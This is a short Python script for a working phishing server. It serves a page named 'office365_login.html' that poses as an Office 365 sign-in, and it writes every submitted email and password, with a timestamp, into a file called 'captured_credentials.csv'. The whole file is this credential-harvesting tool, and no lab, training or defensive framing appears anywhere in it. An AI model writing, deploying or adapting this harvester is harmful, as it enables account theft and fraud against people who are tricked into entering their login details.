from http.server import HTTPServer, BaseHTTPRequestHandler
import csv, os, datetime

BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, 'captured_credentials.csv')

class Handler(BaseHTTPRequestHandler):
    def _serve(self):
        with open(os.path.join(BASE, 'office365_login.html'), 'rb') as f:
            body = f.read()
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        self._serve()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        raw = self.rfile.read(length).decode('utf-8')
        pairs = dict(kv.split('=', 1) for kv in raw.split('&') if '=' in kv)
        email = pairs.get('email', '')
        password = pairs.get('password', '')
        new = not os.path.exists(LOG)
        with open(LOG, 'a', newline='') as f:
            w = csv.writer(f)
            if new:
                w.writerow(['timestamp', 'email', 'password'])
            w.writerow([datetime.datetime.now().isoformat(), email, password])
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

HTTPServer(('127.0.0.1', 8080), Handler).serve_forever()
